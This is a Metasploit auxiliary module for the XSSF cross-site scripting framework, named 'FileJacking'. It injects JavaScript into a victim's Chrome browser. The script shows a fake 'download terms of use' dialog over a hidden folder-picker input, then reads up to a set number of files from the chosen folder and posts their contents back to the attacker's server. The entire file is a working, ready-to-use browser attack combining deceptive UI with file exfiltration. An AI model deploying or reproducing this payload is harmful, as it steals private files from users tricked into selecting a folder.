require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'FileJacking',
			'Description' => 'This module permits to steal victim\'s files on Google Chrome',
			'Author'      => [ 'Krzysztof Kotowicz' ]  	# Original discovery, full disclsoure: http://blog.kotowicz.net/2011/04/how-to-make-file-server-from-your.html
		))
		
		register_options(
			[
				OptInt.new('nbFiles', [true, 'Numbers of file to get in the targeted folder', 5])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		random = Rex::Text.rand_text_alphanumeric(rand(10) + 5)
		
		code = %{
			s = document.createElement('style');
			s.innerHTML = "#osx-modal-content#{random}, #osx-modal-data#{random} {display:none;}";
			s.innerHTML +="#osx-overlay#{random} {background-color:#000; cursor:wait;}";
			s.innerHTML +="#osx-container#{random} {background-color:#eee; color:#000; font: 16px/24px 'Lucida Grande',Arial,sans-serif; padding-bottom:4px; width:600px; -moz-border-radius-bottomleft:6px; -webkit-border-bottom-left-radius:6px; -moz-border-radius-bottomright:6px; -webkit-border-bottom-right-radius:6px; border-radius:0 0 6px 6px; -moz-box-shadow:0 0 64px #000; -webkit-box-shadow:0 0 64px #000; box-shadow:0 0 64px #000;}";
			s.innerHTML +="#osx-container#{random} a {color:#ddd;}";
			s.innerHTML +="#osx-container#{random} #osx-modal-title#{random} {color:#000; background-color:#ddd; border-bottom:1px solid #ccc; font-weight:bold; padding:6px 8px; text-shadow:0 1px 0 #f4f4f4;}";
			s.innerHTML +="#osx-container#{random} .close {display:none; position:absolute; right:0; top:0;}";
			s.innerHTML +="#osx-container#{random} .close a {display:block; color:#777; font-weight:bold; padding:6px 12px 0; text-decoration:none; text-shadow:0 1px 0 #f4f4f4;}";
			s.innerHTML +="#osx-container#{random} .close a:hover {color:#000;}";
			s.innerHTML +="#osx-container#{random} #osx-modal-data#{random} {font-size:12px; padding:6px 12px;}";
			
			s.innerHTML +="input[type='file'] {opacity: 0; position: absolute; left: 230; bottom: 5; width: 300px; line-height: 20px; height: 25px; }";
			s.innerHTML +="#cloak#{random} { position: absolute; left: 230;  cursor:pointer; bottom: 5; line-height: 20px; height: 25px; } ";
			document.body.appendChild(s);
			
			s = document.createElement('script');
			s.src = "resources/jquery.js";
			document.body.appendChild(s);
			
			d = document.createElement('div');
			d.id = "osx-modal-content#{random}";
			d.style.display = "none";
			d.innerHTML = "<div id='osx-modal-title#{random}'>Please download website terms of use!</div><div id='osx-modal-data#{random}'><center><p>Before you continue browsing this site, thank you download and read the terms of use!</p></center><br/><center><button id='cloak#{random}'>Download to...</button><input id='file_input#{random}' type='file' directory='' webkitdirectory=''></center></div>";
			document.body.appendChild(d);
			
			function func1() {
				s = document.createElement('script');
				s.src = "resources/jquery.simplemodal.js";
				document.body.appendChild(s);
			}

				
			function func2() {
				jQuery(function ($) {
					var OSX = {
						container: null,
						init: function () {

								$("#osx-modal-content#{random}").modal({
									overlayId: 'osx-overlay#{random}',
									containerId: 'osx-container#{random}',
									closeHTML: null,
									minHeight: 80,
									opacity: 65, 
									position: ['0',],
									overlayClose: true,
									onOpen: OSX.open,
									onClose: OSX.close
								});
						},
						open: function (d) {
							var self = this;
							self.container = d.container[0];
							d.overlay.fadeIn('slow', function () {
								$("#osx-modal-content#{random}", self.container).show();
								var title = $("#osx-modal-title#{random}", self.container);
								title.show();
								d.container.slideDown('slow', function () {
									setTimeout(function () {
										var h = $("#osx-modal-data#{random}", self.container).height()
											+ title.height()
											+ 20; // padding
										d.container.animate(
											{height: h}, 
											200,
											function () {
												$("div.close", self.container).show();
												$("#osx-modal-data#{random}", self.container).show();
											}
										);
									}, 300);
								});
							})
						},
						close: function (d) {
							var self = this; // this = SimpleModal object
							d.container.animate(
								{top:"-" + (d.container.height() + 20)},
								500,
								function () {
									self.close(); // or $.modal.close();
								}
							);
						}
					};

					OSX.init();

				});
		
				$('#file_input#{random}').change(function(e) {
					filelist = e.target.files;
					
					try {
						for (i = 0; i < filelist.length; i++) {
							if (i >= #{datastore['nbFiles']}) 		// 5 files maxi
								break;
								
							eval("f" + i + " = filelist[i];");
							
							eval("reader_" + i + " = new FileReader();");
							eval("reader_" + i + ".readAsBinaryString(f" + i + ");");
							eval("reader_" + i + ".onloadend = function(){XSSF_POST(reader_" + i + ".result, '#{self.name} - `' + f" + i + ".webkitRelativePath + '`');}");
						}
					} catch(e) {}
				}).click(function() {}); 
			}
			
			setTimeout(func1, 1000);
			setTimeout(func2, 2500);
		}
		
		send_response(cli, code)
	end
end